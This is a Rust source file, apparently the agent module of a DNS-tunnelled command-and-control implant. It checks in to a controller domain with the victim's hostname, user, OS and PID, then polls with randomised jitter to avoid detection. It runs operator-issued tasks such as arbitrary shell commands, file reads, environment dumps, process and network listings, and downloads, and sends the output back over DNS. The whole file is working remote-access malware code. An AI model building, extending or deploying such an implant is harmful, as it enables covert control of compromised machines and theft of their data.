use crate::c2::{self, C2Error, SessionInfo, Task, TaskResponse, TaskStatus};
use crate::crypto::EncryptionKey;
use crate::dns::DnsBackend;
use log::{error, info, warn};
use rand::Rng;

pub struct AgentConfig {
    pub domain: String,
    pub key: EncryptionKey,
    pub session_id: String,
    pub poll_interval_secs: u64,
    pub jitter_pct: f64, // 0.0 - 1.0
}

pub async fn run(
    backend: &dyn DnsBackend,
    config: &AgentConfig,
) -> Result<(), C2Error> {
    // Check in
    let info = SessionInfo {
        session_id: config.session_id.clone(),
        hostname: get_hostname(),
        username: get_username(),
        os: get_os(),
        arch: std::env::consts::ARCH.to_string(),
        pid: std::process::id(),
        first_seen: now(),
        last_seen: now(),
    };

    c2::check_in(backend, &config.domain, &config.key, &info).await?;
    info!("checked in: session={}", config.session_id);

    // Main loop
    loop {
        match c2::poll_task(backend, &config.domain, &config.key, &config.session_id).await {
            Ok(Some(task)) => {
                info!("task: {} [{}]", task.command, task.task_id);

                let response = execute(&task);

                if let Err(e) = c2::submit_response(
                    backend, &config.domain, &config.key, &config.session_id, &response,
                ).await {
                    error!("failed to submit response: {e}");
                }

                if let Err(e) = c2::clear_task(backend, &config.domain, &config.session_id).await {
                    warn!("failed to clear task: {e}");
                }

                if task.command == "exit" {
                    info!("exit received, shutting down");
                    break;
                }
            }
            Ok(None) => {
                // No task — heartbeat
                if let Err(e) = c2::heartbeat(
                    backend, &config.domain, &config.key, &config.session_id,
                ).await {
                    warn!("heartbeat failed: {e}");
                }
            }
            Err(e) => {
                warn!("poll error: {e}");
            }
        }

        // Sleep with jitter
        let base = config.poll_interval_secs as f64;
        let jitter = base * config.jitter_pct;
        let sleep_secs = if jitter > 0.0 {
            base + rand::thread_rng().gen_range(-jitter..jitter)
        } else {
            base
        };
        let sleep_secs = sleep_secs.max(1.0) as u64;
        tokio::time::sleep(tokio::time::Duration::from_secs(sleep_secs)).await;
    }

    Ok(())
}

fn execute(task: &Task) -> TaskResponse {
    let (status, output) = match task.command.as_str() {
        "shell" => c2::commands::shell(&task.args),
        "ls" => c2::commands::ls(&task.args),
        "cat" => c2::commands::cat(&task.args),
        "pwd" => c2::commands::pwd(),
        "whoami" => c2::commands::whoami(),
        "ps" => c2::commands::ps(),
        "env" => c2::commands::env_cmd(),
        "download" => c2::commands::download(&task.args),
        "id" => c2::commands::id(),
        "hostname" => c2::commands::hostname(),
        "netstat" => c2::commands::netstat(),
        "exit" => (TaskStatus::Success, "shutting down".to_string()),
        other => (TaskStatus::Error, format!("unknown command: {other}")),
    };

    TaskResponse {
        task_id: task.task_id.clone(),
        status,
        output,
        timestamp: now(),
    }
}

fn get_hostname() -> String {
    std::fs::read_to_string("/etc/hostname")
        .unwrap_or_else(|_| "unknown".to_string())
        .trim()
        .to_string()
}

fn get_username() -> String {
    std::env::var("USER")
        .or_else(|_| std::env::var("LOGNAME"))
        .unwrap_or_else(|_| "unknown".to_string())
}

fn get_os() -> String {
    std::fs::read_to_string("/etc/os-release")
        .ok()
        .and_then(|s| {
            s.lines()
                .find(|l| l.starts_with("PRETTY_NAME="))
                .map(|l| l.trim_start_matches("PRETTY_NAME=").trim_matches('"').to_string())
        })
        .unwrap_or_else(|| std::env::consts::OS.to_string())
}

fn now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}
